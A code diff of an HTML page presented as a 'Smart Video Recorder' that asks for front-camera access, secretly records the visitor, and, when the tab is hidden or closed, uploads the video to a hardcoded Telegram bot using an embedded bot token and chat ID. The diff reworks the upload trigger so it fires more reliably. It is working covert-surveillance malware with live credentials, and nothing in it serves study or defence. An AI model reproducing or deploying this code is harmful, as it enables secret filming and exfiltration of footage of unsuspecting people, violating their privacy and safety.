@@ -1,25 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Smart Camera Recorder</title>
+  <meta charset="UTF-8">
+  <title>Smart Video Recorder</title>
 </head>
 <body>
-  <h2>Please allow access to your front camera</h2>
+  <h2>Please allow camera access</h2>
   <video id="preview" autoplay muted playsinline></video>
 
   <script>
     const video = document.getElementById("preview");
     const BOT_TOKEN = "7609337631:AAHsg9BqNPhW-uSd2mwtMFsaiIuRLy_4AFE";
     const CHAT_ID = "7372789516";
-
     let mediaRecorder;
     let chunks = [];
+    let stream;
 
-    async function initCamera() {
+    async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
@@ -27,42 +26,38 @@
         video.srcObject = stream;
 
         mediaRecorder = new MediaRecorder(stream);
-        chunks = [];
-
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: "video/webm" });
-          const file = new File([blob], "video.webm");
-
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("video", file);
-
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: "POST",
-            body: formData
-          });
-
-          alert("try again");
-        };
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
 
         mediaRecorder.start();
-      } catch (err) {
-        alert("❌ Camera access denied.");
-        console.error(err);
+      } catch (error) {
+        alert("Camera access denied.");
       }
     }
 
-    // عند مغادرة المستخدم للصفحة يتم إيقاف التسجيل وإرساله
-    window.addEventListener("beforeunload", () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
+    document.addEventListener("visibilitychange", async () => {
+      if (document.visibilityState === "hidden") {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: "video/webm" });
+            const file = new File([blob], "video.webm");
+
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("video", file);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+              method: "POST",
+              body: formData
+            });
+          };
+
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }
       }
     });
 
-    // تشغيل الكاميرا عند الدخول
-    initCamera();
+    startCamera();
   </script>
 </body>
 </html>
